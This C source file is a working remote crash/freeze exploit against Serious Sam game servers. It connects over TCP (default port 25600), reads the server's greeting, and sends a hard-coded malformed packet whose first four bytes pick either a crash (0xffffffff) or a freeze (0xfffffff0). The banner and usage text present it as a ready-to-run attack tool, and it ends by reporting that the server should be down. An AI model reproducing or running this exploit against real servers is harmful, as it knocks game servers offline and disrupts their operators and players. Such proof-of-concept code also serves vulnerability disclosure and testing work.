/*

by Luigi Auriemma


This source is covered by GNU/GPL

UNIX & WIN VERSION
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN
    #include <winsock.h>
    #include <malloc.h>
    #include "winerr.h"

    #define close       closesocket
    #define ONESEC      1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>

    #define ONESEC      1
#endif






#define VER         "0.1"
#define BUFFSZ      2048
#define PORT        25600
#define TIMEWAIT    5







u_long resolv(char *host);
void std_err(void);








int main(int argc, char *argv[]) {
    int         sd,
                err,
                port;
    struct  sockaddr_in     peer;
    u_char      *buff,
                type,
                pck[] =
/* bug */   "\xff\xff\xff\xff"
            "\x40\xE1\xDE\x03\xFB\xCA\x2A\xBC\x83\x01\x00\x00\x07\x47\x41"
            "\x54\x56\x10\x27\x00\x00\x05\x00\x00\x00\x00\x00\x01\x00\x00"
            "\x00\x01\x00\x00\x00\xA0\x0F\x00\x00\x64\x00\x00\x00";



    setbuf(stdout, NULL);

    fputs("\n"
        "Serious Sam TCP remote crash/freeze "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\nUsage: %s <type> <server> [port(%u)]\n"
            "\nType of crash:\n"
            "0 = crash (0xffffffff)\n"
            "1 = freeze (0xfffffff0)\n"
            "\n", argv[0], PORT);
        exit(1);
    }



#ifdef WIN
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    type = argv[1][0] & 1;
    if(type) memcpy(pck, "\xf0\xff\xff\xff", 4);
        else memcpy(pck, "\xff\xff\xff\xff", 4);


    if(argc > 3) port = atoi(argv[3]);
        else port = PORT;

    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;


    buff = malloc(BUFFSZ);
    if(!buff) std_err();


    printf("\nConnection to %s:%hu\n",
        inet_ntoa(peer.sin_addr),
        port);

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    err = connect(sd, (struct sockaddr *)&peer, sizeof(peer));
    if(err < 0) std_err();



        /* 1 recv */

    err = recv(sd, buff, BUFFSZ, 0);
    if(err < 0) std_err();
    if(!err) {
        fputs("\nError: the server has closed the connection, retry\n", 
stdout);
        exit(1);
    }
    fputc('.', stdout);



        /* BOOOOOM */

    err = send(sd, pck, sizeof(pck) - 1, 0);
    if(err < 0) std_err();

    fputs("\nMalformed data sent, now I need to wait some seconds...\n", 
stdout);

    for(err = TIMEWAIT; err > 0; err--) {
        printf("%d\r", err);
        sleep(ONESEC);
    }

    close(sd);


    fputs("\nThe exploit is terminated and the server should be down, 
check it\n", stdout);

    free(buff);
    return(0);
}










u_long resolv(char *host) {
    struct    hostent    *hp;
    u_long    host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolve hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)(hp->h_addr);
    }

    return(host_ip);
}







#ifndef WIN
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif




